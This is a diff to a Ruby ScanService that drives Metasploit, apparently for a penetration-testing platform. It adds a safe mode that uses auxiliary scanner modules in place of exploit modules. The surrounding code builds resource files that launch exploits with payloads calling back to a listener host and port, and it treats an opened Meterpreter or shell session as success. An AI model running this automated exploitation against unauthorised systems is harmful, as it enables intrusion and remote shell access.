@@ -7,7 +7,8 @@ require 'net/smtp'
 require 'thread'
 
 class ScanService
-  MSF_BASE = ENV.fetch('MSF_MODULES_PATH', '/opt/metasploit-framework/embedded/framework/modules/exploits')
+  MSF_BASE           = ENV.fetch('MSF_MODULES_PATH',   '/opt/metasploit-framework/embedded/framework/modules/exploits')
+  MSF_AUXILIARY_BASE = ENV.fetch('MSF_AUXILIARY_PATH', '/opt/metasploit-framework/embedded/framework/modules/auxiliary')
 
   def initialize(org_id, filter_params, user_id, scan = nil, asset_ids = [], scan_options = {})
     @org_id        = org_id
@@ -178,7 +179,11 @@ class ScanService
       end
 
       output  = File.read(log_file.path)
-      success = output.match?(/session \d+ opened|Meterpreter session|Command shell session/i)
+      success = if @scan_options[:safe_mode]
+        output.match?(/\[\+\]/i)
+      else
+        output.match?(/session \d+ opened|Meterpreter session|Command shell session/i)
+      end
       evidence_lines = output.scan(/\[\+\].*|.*session \d+ opened.*/i).join("\n")
       evidence = evidence_lines.length > 500 ? evidence_lines[0, 500] : evidence_lines
       { success: success, evidence: evidence.presence || (success ? 'Session established' : nil) }
@@ -192,6 +197,11 @@ class ScanService
   end
 
   def build_resource_file(exploit, target_ip, port, proxy)
+    @scan_options[:safe_mode] ? build_auxiliary_rc(exploit, target_ip, port, proxy)
+                              : build_exploit_rc(exploit, target_ip, port, proxy)
+  end
+
+  def build_exploit_rc(exploit, target_ip, port, proxy)
     lhost   = ENV.fetch('MSF_LHOST', '100.69.88.107')
     lport   = ENV.fetch('MSF_LPORT', '4444')
     payload = exploit['default_payload'].presence || default_payload_for(exploit)
@@ -209,6 +219,19 @@ class ScanService
       "run -z",
       "sleep 15",
       "sessions -l",
+      "exit -y"
+    ].compact
+    lines.join("\n") + "\n"
+  end
+
+  def build_auxiliary_rc(exploit, target_ip, port, proxy)
+    lines = [
+      "use #{exploit['metasploit_module']}",
+      "set RHOSTS #{target_ip}",
+      "set RPORT #{port}",
+      "set ConnectTimeout 15",
+      (proxy ? "set Proxies #{proxy}" : nil),
+      "run",
       "exit -y"
     ].compact
     lines.join("\n") + "\n"
@@ -311,11 +334,20 @@ class ScanService
   def get_modules_for_target(target_os)
     allowlist = @filter_params['module_allowlist']
 
-    dirs  = platform_dirs(target_os)
-    files = dirs.any? ? dirs.flat_map { |d| Dir.glob("#{MSF_BASE}/#{d}/**/*.rb") }
-                      : Dir.glob("#{MSF_BASE}/**/*.rb")
+    if @scan_options[:safe_mode]
+      base   = MSF_AUXILIARY_BASE
+      prefix = 'auxiliary/'
+      dirs   = auxiliary_scanner_dirs(target_os)
+    else
+      base   = MSF_BASE
+      prefix = 'exploit/'
+      dirs   = platform_dirs(target_os)
+    end
 
-    mods = files.uniq.map { |f| { path: 'exploit/' + f.sub("#{MSF_BASE}/", '').sub('.rb', ''), file: f } }
+    files = dirs.any? ? dirs.flat_map { |d| Dir.glob("#{base}/#{d}/**/*.rb") }
+                      : Dir.glob("#{base}/**/*.rb")
+
+    mods = files.uniq.map { |f| { path: prefix + f.sub("#{base}/", '').sub('.rb', ''), file: f } }
     allowlist.present? ? mods.select { |m| allowlist.include?(m[:path]) } : mods
   end
 
@@ -325,6 +357,15 @@ class ScanService
     when 'linux'   then %w[linux unix multi]
     when 'macos'   then %w[osx apple_ios multi]
     else []
+    end
+  end
+
+  def auxiliary_scanner_dirs(platform)
+    case platform&.downcase
+    when 'windows' then %w[scanner/smb scanner/http scanner/ssh scanner/vnc]
+    when 'linux'   then %w[scanner/ssh scanner/ftp scanner/http scanner/mysql scanner/postgres]
+    when 'macos'   then %w[scanner/ssh scanner/http scanner/vnc]
+    else                %w[scanner/ssh scanner/ftp scanner/http]
     end
   end
 
